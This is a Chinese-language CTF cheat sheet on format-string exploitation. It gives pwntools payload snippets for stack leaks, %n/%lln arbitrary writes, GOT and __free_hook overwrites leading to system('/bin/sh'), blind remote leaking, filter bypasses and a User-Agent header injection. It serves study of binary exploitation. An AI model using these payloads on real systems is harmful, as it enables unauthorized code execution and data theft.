---

phase: binary
vuln_class: [pwn, format-string, arbitrary-write, got-overwrite, glibc-internals]
title: 格式串利用
summary: 格式串给两个原语——任意读（`%s`）和任意写（`%n` 族）。判据是先确认能不能把地址放进 payload，不能就得换路子（非位置参数、改 EBP、改 `.rela.plt`、改 `scanf` 自己的格式串）。
---

# 格式串利用

溢出与偏移见 [[binary/漏洞利用/overflow-basics.md|栈与基础溢出]]；ROP 链见 [[binary/漏洞利用/rop-and-shellcode.md|ROP 与 shellcode]]；堆与 hooks 见 [[binary/漏洞利用/heap-techniques.md|堆利用]]。

## 0. 判据速查

| 卡在哪 | 解法 | 去哪节 |
|---|---|---|
| 不确定有没有洞 | 发 `%p.%p.%p`，输出里有十六进制就是 | §1 |
| 要写 8 字节 GOT 项 | `%lln`（`%n` 只写 4 字节，高 4 字节留旧值） | §1 |
| 不知道怎么定位自己的输入 | 填充到 N 字节后，地址落在偏移 `6 + N/8` | §1 |
| 地址放不进 payload（过滤/换行） | 非位置 `%n` 改指针槽，再打 | §2 |
| 没有二进制，只有远程 | 盲打：泄栈 → 认 canary/PIE → dump GOT → libc.rip | §3 |
| `%` 被过滤 | `%%%p`——第三个 `%` 活下来 | §4 |
| 只能泄不能写（`__printf_chk`） | 串行 `%p` 到任意偏移，配别的溢出打 | §5 |
| 只有一次 printf 就 `exit()` | 一次调用里同时 `%p` 泄 + `%hn` 写 | §6 |
| Full RELRO，GOT 不可写 | `__free_hook`（glibc < 2.34）或 `.rela.plt`/`.dynsym` | §7、§8 |
| GOT 地址里有坏字节（如 `0x0a`） | 改 `.rela.plt` 的符号索引 + `.dynsym` 的 `st_value` | §8 |
| buffer 在 `.bss` 不在栈上 | 改 saved EBP，让 `leave;ret` 落到 `.bss` | §9 |
| 想让 canary 失败信息泄密 | 盖掉 `argv[0]` 指向密码 | §10 |
| 后续没有 GOT 函数被调用 | `.fini_array` 写回 `main` 做循环 | §11 |
| 输入会先被 ROT13/XOR 处理 | 用逆变换预编码整个 payload | §12 |
| 漏洞在 HTTP 头里 | 直接把 `%p` 塞 `User-Agent` | §13 |
| buffer 只有 16 字节，地址放后面就截断 | 格式指令在前、地址在后 | §14 |
| 目标是游戏/状态机 | 直接 `%n` 改游戏变量，不需要 shell | §15 |
| `strlen` 过滤但长度存 `int8_t` | 255 字节填充让窗口塌成 0 | §16 |
| `scanf` 的格式串在栈上 | 先溢出改 `%30s` 成 `%99s` | §17 |
| Objective-C 目标 | `%@` 走 `objc_msg_lookup`，`call rax` 可控 | §18 |

## 1. 基础

```python
# 泄漏
io.sendline(b'%p.%p.%p.%p')
# 指定偏移
io.sendline(b'%7$p')
# 任意读
payload = flat({0: b'%7$s#', 8: addr})
# 任意写
payload = fmtstr_payload(offset, {target: value})
```

**写宽度**：`%n`=4 字节、`%hn`=2、`%hhn`=1、`%lln`=8。

**x86-64 上 GOT 项是 8 字节，必须用 `%lln`**。用 `%n` 只改低 4 字节，高 4 字节还是原来的 libc 地址残渣，跳过去必崩。这是新手最常踩的一脚。

**偏移计算**：缓冲区从偏移 6 开始（前 5 个是寄存器参数），格式串填充到 N 字节后，地址落在 `6 + N/8`。

```python
fmt = f'%{win}c%8$lln'.encode().ljust(16, b'X')   # 16 字节 → 偏移 8
payload = fmt + p64(target_got)
```

注意 `%{win}c` 会打印 `win` 个字符——`win` 是 `0x4011f6` 就是 400 万字节，**要耐心等输出，别把 recv 超时设太短**。

**验证偏移**：`test = b'%8$p___XXXXXXXXX'`（16 字节）+ `p64(0xDEADBEEF)`，输出里该看到 `0xdeadbeef`。

**GOT 目标选择**：优先选「格式串之后才会被调用」的函数。`exit@GOT` 不行就试 `printf@GOT`、`puts@GOT`、`putchar@GOT`——去反汇编里看调用顺序。

## 2. 非位置参数改指针槽

不能把地址写进 payload（过滤、换行、长度限制），但仍能用 `%n` 且栈上有可控指针时：

**非位置说明符按顺序消费参数**，所以可以「先改掉一个未来才会被用的参数（它本身是个指针），再拿它当写目标」。

**为什么必须非位置**：`%22$hn` 这种位置写法会被 glibc 在解析开头就缓存住，之后改底层栈槽没用；非位置 `%n` 不吃这个缓存。

```text
%c%c%c...%c      # 用 %c 逐个消费参数，推进到目标指针槽
%<big>c%n        # 把该槽改成 target_addr（如 exit@GOT）
%<delta>c%hn     # 向这个已被改写的指针写低 2 字节
```

`delta = (W - (C % 65536)) mod 65536`，其中 `C` 是前面已打印的字符数，`W` 是目标低 16 位。

前提：No PIE 或 Partial RELRO，且能接受百万级输出。

## 3. 盲打（无二进制）

```text
> %p-%p-%p-%p
0x563b6749100b-0x71-0xffffffff-0x7ffff9c37b80
```

顺序发现：认 canary（`0x...00` 结尾）→ 认 saved RBP（栈地址）→ 认返回地址（代码指针）→ 算 PIE 基址 → 用任意读 dump GOT → 拿 `puts`/`__stack_chk_fail` 等地址去 [libc.rip](https://libc.rip/) 比对版本。

常见偏移（x86-64）：

| 偏移 | 内容 |
|---|---|
| 6-8 | 自己的输入缓冲区 |
| ~39 | canary |
| ~40 | saved RBP |
| ~41-43 | 返回地址 |

**别指望偏移固定**，不同 libc/编译选项下会挪，先 `%1$p` 到 `%50$p` 全打一遍看。

## 4. `%` 被过滤

过滤逻辑看 `%` 后面那个字符时：

- `%p` → 被拦
- `%%p` → 正确转义，输出字面量 `%p`
- `%%%p` → **第三个 `%` 活下来**，输出栈值

`%%%p` 能用就还能打 `%hhn`：`%%%dc%%%d$hhn` 之类，注意 `%%` 在输出里算一个字符。

## 5. `__printf_chk` 只能泄不能写

`__printf_chk`（`_FORTIFY_SOURCE` 产物）禁 `%n`/`%hn`/`%hhn`，也禁 `%123$p` 直接索引，但**串行 `%p` 照样能用**：

```python
payload = "%p." * 267 + "%p"        # 走到偏移 267
leaks = io.recvline().decode().split(".")
canary = int(leaks[266], 16)
```

偏移可能到几百，输出极大，**必须用分隔符**（`.`）再 `split`，否则解析错位。

拿到 canary/libc/PIE 后，用另一个溢出漏洞打 ROP——`__printf_chk` 只堵写，不堵读。

## 6. 一次 printf 同时泄和写

漏洞之后立刻 `exit(0)`，只有一次机会。

```python
payload  = b'e_______'                    # 8 字节填充
payload += p64(0x4141414141)              # 被 %25$p 消费的假地址
payload += b' %25$p'                      # 泄 libc
bytes_written = len(payload)
pad = (target_low16 - bytes_written) % 0x10000
payload += f'%{pad}c%19$hn'.encode()      # 写 exit@GOT 低 2 字节
payload += b'A' * ((8 - len(payload) % 8) % 8)
payload += p64(exit_got)
```

`exit@GOT` 改成 `main` 就拿到第二次机会。**关键是偏移算准**：`%25$p` 和 `%19$hn` 指向的位置不同，两个都要先验证。

## 7. `__free_hook`（glibc < 2.34）

Full RELRO 下 GOT 不可写，但 `__free_hook` 可写。

`free(ptr)` 把 `ptr` 放 `rdi`，所以 `__free_hook = system` 时 `free("cat flag")` 就等于 `system("cat flag")`。

```python
free_hook = libc_base + libc.symbols['__free_hook']
payload = fmtstr_payload(8, {free_hook: libc_base + libc.symbols['system']},
                         write_size='byte')
p.sendline(b'cat flag')
```

**glibc >= 2.34 hooks 已移除**，改打返回地址或 `_IO_FILE` 结构体（见 [[binary/漏洞利用/heap-fsop.md|FILE 结构体]]）。

## 8. 改 `.rela.plt` + `.dynsym`

GOT 地址里含坏字节（`0x0a` 遇 `fgets`、`0x20` 遇 `scanf`）时，**根本不碰 GOT**：改重定位表里的符号索引，让它指向另一个符号，再改那个符号的 `st_value` 为 `win()`。

```python
REL_SYM_BYTE    = 0x4006ec   # .rela.plt[exit].r_info 里的符号索引字节
STDOUT_STVAL_LO = 0x4004e8   # .dynsym[11].st_value 低半字
STDOUT_STVAL_HI = 0x4004ea   # 高半字
```

三步：写符号索引 `0x0b` 到 `r_info` 那个字节 → 写 `win()` 低 16 位到 `st_value` → 写高 16 位到 `st_value+2`。下次调 `exit()` 时链接器按改过的链跳到 `win()`。

判据：`readelf -S` 看 `.rela.plt`/`.dynsym` 是否可写；`r_info` 的符号索引在 64 位下占**高 32 位**，别改错字节。

## 9. `.bss` 缓冲区改 saved EBP

格式串 buffer 在 `.bss`（固定地址）而不是栈上时，**没法把地址塞进栈**——经典 `%n` 打法直接失效。

改打 saved EBP：`leave; ret` 是 `mov esp,ebp; pop ebp; pop eip`，所以控 EBP 就控 `ret` 从哪取 EIP。

```text
[addr_of_buf - 4][padding_to_write_value][%n][shellcode...]
```

把 `buf_addr - 4` 写进 saved EBP。函数返回时 `leave` 令 `esp = buf_addr - 4`，`pop ebp` 吃掉那 4 字节，`ret` 就从 `buf_addr` 取——正好是 shellcode 开头。

## 10. 盖 `argv[0]` 让崩溃泄密

canary 被破坏时 glibc 打印 `*** stack smashing detected ***: <argv[0]> terminated`。而 `argv[0]` 是栈上的一个指针。

```python
payload  = b"A" * canary_offset                  # 故意破坏 canary
payload += b"B" * (argv0_offset - canary_offset)
payload += p64(password_addr)                    # argv[0] → 密码串
```

「失败的利用」变成信息泄漏。**这是第一阶段手法**：泄到密码/canary/地址，第二次连接再真打。

## 11. `.fini_array` 循环

`printf()` 之后没有任何 GOT 函数被调用时，用 `.fini_array` 把 `main` 写回去，做多阶段：

1. `.fini_array[0] = main` → 泄 libc 和栈指针
2. `printf@GOT = system`，`__stack_chk_fail@GOT = main`
3. 故意破坏 canary → `__stack_chk_fail` 重新进 `main`，此时 `printf(input)` 已是 `system(input)`，发 `/bin/sh`

**故意破坏 canary 是被设计过的重入向量**，不是失误。

## 12. 输入会被变换时

二进制在送进 `printf` 前做了 ROT13（或 XOR/Base64/凯撒），**用逆变换预编码整个 payload**。

```python
encoded = rot13(payload.decode('latin-1')).encode('latin-1')
io.sendline(encoded)
```

ROT13 自逆，所以 `rot13(rot13(x)) == x`。任何可逆变换都同理——**关键是变换后 `%` 和地址字节仍能活下来**。

打 `strlen@GOT = system`，然后发 `/bin/sh`：`strlen("/bin/sh")` 变 `system("/bin/sh")`。

## 13. HTTP 头里的格式串

服务器用 `printf(ua)` 记日志时，任何被解析进格式串 sink 的头都是泄漏口：

```python
r = requests.get('http://target/', headers={'User-Agent': '%6$p.%7$p'})
canary, pie = [int(x, 16) for x in r.text.strip().split('.')]
```

**先扫日志/错误信息/回显头**，再假设需要二进制本地原语。

## 14. 小缓冲区 + 地址含 null

buffer 只有 16 字节，`fmtstr_payload` 直接失败——`printf` 在地址的第一个 `\x00` 就停了。

**把格式指令放前面、地址放后面**：`printf` 先解析完指令，再通过 `%N$n` 引用尾部那个槽。

```python
fmtstr = b"%9x%11$n" + b"\x20\x20\x60\x00\x00\x00\x00\x00"
```

`printf` 处理 `%9x%11$n` 时用的是偏移 11 处的地址（尾部 8 字节），写 `0x9` 到 `0x602020`。

## 15. 游戏状态直接改

游戏/状态机题的格式串**不需要 shell**，改游戏变量就够：

```python
p.sendline(b'%1000c%7$n')      # 栈位置 7 = player_chips 指针
```

发现流程：`%p` 确认洞 → 试 `%6$n`/`%7$n`/`%8$n` 配不同 `%Xc` → 比对游戏输出（筹码/分数/血量）哪一项变了 → 定胜利条件 → 打。

常见位置：6 = 对手状态、7 = 自己状态、8-10 = 分数/血量/背包。相邻变量（差 4 字节）时位置 N 和 N+1 各指一个——`%N$n`（打印 0 字符）把对手清零，`%9999c%(N+1)$n` 把自己拉满。

## 16. `strlen` 截断绕过

```c
void filter(char *input) {
    int8_t len = (int8_t)strlen(input);   // 长度 255 时 (int8_t)(255+1) 溢出成 0
    for (int8_t i = 0; i <= len; i++)     // 窗口塌成空，一个字节都不检查
        if (!islower(input[i])) reject();
}
```

```python
payload = b'a' * 255 + b'%7$n' + p64(target_addr)
```

**任何长度字段存在 `int8_t`/`int16_t`/`short` 里都要算一下边界。**

## 17. `scanf` 格式串在栈上

`scanf` 的 `"%30s"` 存在栈上（不是 `.rodata`）时，第一次输入可以溢出到它：

```python
payload0 = b"0" * 0x14 + p32(0x73393925)   # 0x73393925 = "%99s"
payload1 = b"0" * 0x31 + p32(win_addr)     # 用扩大后的缓冲区打到返回地址
```

**怎么判**：反汇编看格式串是 `lea rax,[rbp-N]`（栈）还是 `lea rax,[rip+X]`（`.rodata`）。前者才有这个两阶段机会。

## 18. Objective-C 的 `%@`

`NSLog(@"%@", x)` 的 `%@` 把对应栈值当对象指针，调 `objc_msg_lookup(rdi, "description")`。构造一个 ISA 为 0 的假对象能让它走到 `call rax`：

```text
[rdi+8] == 0  →  ISA 检查失败 → 执行到 call rax
```

所以：用 `%n` 把假对象地址写到 `%N$@` 对应的栈槽，假对象里 `[0]=0`（ISA）、`[8]=0`，再把 `rax` 用前面的 `%n` 设成 one_gadget。**只读的 FSB 在这里变成了可控调用原语。**

## 19. glibc printf 内部表（溢出也能用）

没有格式串漏洞、但有能改到 glibc 全局变量的溢出时，`printf_function_table` 是一条绕过路径：

`printf_function_table != NULL` 时，glibc 不再用默认处理器，而是按格式字符去 `printf_arginfo_table['d']` 查函数指针。

四步：溢出把 `__libc_argv` 指向 flag → 造一个假 `arginfo` 表项指向 `_fortify_fail` → `printf_function_table` 设非 NULL → `printf_arginfo_table` 指假表。

之后任何 `printf("%d")` 都触发 `_fortify_fail`，它打印 `__libc_argv[0]`——正好是 flag。

**这是「没有格式串漏洞却想用格式串机制」的路子**，目标通常是泄密而不是拿 shell。

## 20. 纪律

- **先确认能不能把地址放进 payload**。这一条决定后面所有路线：能→经典 `%n`；不能→§2 改指针槽 / §9 改 EBP / §8 改重定位表 / §14 指令前置。
- **`%n` 写 GOT 一定要 `%lln`**。`%n` 只写 4 字节，高 4 字节残留必崩——这不是「有时能过」，是必然崩。
- **偏移永远先验证再打**。`%N$p` 打出 `0x41414141` 之类才说明那个位置是自己的数据。
- **`__printf_chk` 不等于不能打**：写被禁了但读没禁，串行 `%p` 照样泄。
- **glibc 版本决定一切**：`__free_hook` 在 2.34 之后不存在，`printf_function_table` 的偏移也随版本变，用前先确认。
